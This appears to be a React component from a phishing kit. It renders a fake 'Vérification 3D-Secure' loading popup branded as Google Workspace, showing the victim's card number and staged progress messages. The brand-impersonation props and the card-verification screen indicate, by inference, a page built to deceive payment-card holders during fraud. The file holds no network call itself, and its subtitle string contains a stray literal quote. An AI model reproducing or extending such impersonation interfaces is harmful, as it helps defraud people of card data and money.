import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from '../PopupHeader';
import styles from '../../styles/modules/LoadingPopup.module.css';

const LoadingPopup = ({ 
  show, 
  isVisible, 
  selectedPlan,
  cardLogo,
  data,
  brandName = "Google Workspace"
}) => {
  // Compatibilité avec les deux systèmes de props
  const visible = show || isVisible;
  
  console.log("LoadingPopup rendu avec visible:", visible, "selectedPlan:", selectedPlan);
  
  if (!visible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={data?.cardNumber}
        />
        
        <div className={styles.content}>
          <div className={styles.iconContainer}>
            <div className={styles.spinner}></div>
          </div>
          
          <h3 className={styles.title}>
            Vérification 3D-Secure
          </h3>
          
          <p className={styles.subtitle}>
              Nous vérifions votre identité, cela peut prendre jusqu\'à 30 secondes.'
          </p>
          
          <div className={styles.detailsList}>
            <div className={styles.detailItem}>
              <span className={styles.checkIcon}>✓</span>
              <span>Envoi des informations</span>
            </div>
            <div className={`${styles.detailItem}`}>
              <span className={`${styles.checkIcon}`}>⏳</span>
              <span>Identité vérifiée</span>
            </div>
            <div className={`${styles.detailItem} `}>
              <span className={`${styles.checkIcon}`}>❌</span>
              <span>Accès sécurisé</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default LoadingPopup; 